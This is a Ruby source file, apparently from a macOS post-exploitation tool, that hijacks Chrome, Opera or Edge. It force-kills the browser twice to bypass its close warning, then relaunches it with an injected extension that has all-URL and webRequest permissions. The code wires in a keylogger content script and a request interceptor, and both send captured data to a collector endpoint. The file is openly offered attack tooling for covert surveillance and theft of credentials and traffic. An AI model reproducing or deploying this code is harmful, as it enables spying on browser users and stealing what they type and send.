require 'voodoo/extension'
require 'voodoo/collector'

module VOODOO

    class Browser
        attr_reader :extension
        attr_accessor :bundle
        attr_accessor :profile
        attr_accessor :process_name

        def initialize(bundle: nil, process_name: nil, profile: nil, extension: Extension.new)
            @bundle = bundle
            @extension = extension
            @process_name = process_name
            @collector_threads = []

            @extension.manifest[:permissions] = ['tabs', '*://*/*', 'webRequest']
        end

        def add_script(content: nil, file: nil, matches: '*://*/*')
            if content == nil && file != nil
                content = File.read file
            end
            if content == nil
                raise StandardError.new(':content or :file argument are required')
            end
            @extension.add_content_script([matches], js: [content])
            self
        end

        def keylogger(matches: [], url_include: '')
            collector = Collector.new
            collector.on_json {|jsond| yield jsond }
            
            options = {
                collector_url: collector.url
            }

            keylogger_js = build_js('keylogger.js', with_options: options)
            @extension.add_content_script(matches, js: [keylogger_js])

            @collector_threads.push(collector.thread)
        end

        def intercept(matches: nil, url_include: nil, body_include: nil, header_exists: nil)
            collector = make_collector() {|jsond| yield jsond }
            options = {
                matches: matches,
                url_include: url_include,
                body_include: body_include,
                header_exists: header_exists,
                collector_url: collector.url
            }
            background_js = build_js('intercept.js', with_options: options)
            @extension.add_background_script content: background_js
        end

        def hijack(url = '')
            # kill the browser process twise, to bypass close warning
            `pkill -a -i "#{@process_name}"`
            `pkill -a -i "#{@process_name}"`
            sleep 0.1

            profile_dir = "--profile-directory=\"#{@profile}\"" if @profile != nil
            `open -b "#{@bundle}" --args #{profile_dir} --load-extension="#{@extension.save}" #{url}`

            for thread in @collector_threads
                thread.join    
            end
        end

        def Browser.Chrome
            self.new(bundle: 'com.google.Chrome', process_name: 'Google Chrome')
        end

        def Browser.Opera
            self.new(bundle: 'com.operasoftware.Opera', process_name: 'Opera')
        end

        def Browser.Edge
            self.new(bundle: 'com.microsoft.edgemac', process_name: 'Microsoft Edge')
        end

        private

        def make_collector
            collector = Collector.new
            collector.on_json {|jsond| yield jsond }
            @collector_threads.push(collector.thread)
            return collector
        end

        def build_js(file, with_options: nil)
            js = File.read(File.join(__dir__, 'js', file))
            if with_options != nil
                js = js.gsub('REBY_INJECTED_OPTIONS', JSON.generate(with_options))
            end
            return js
        end
    end

end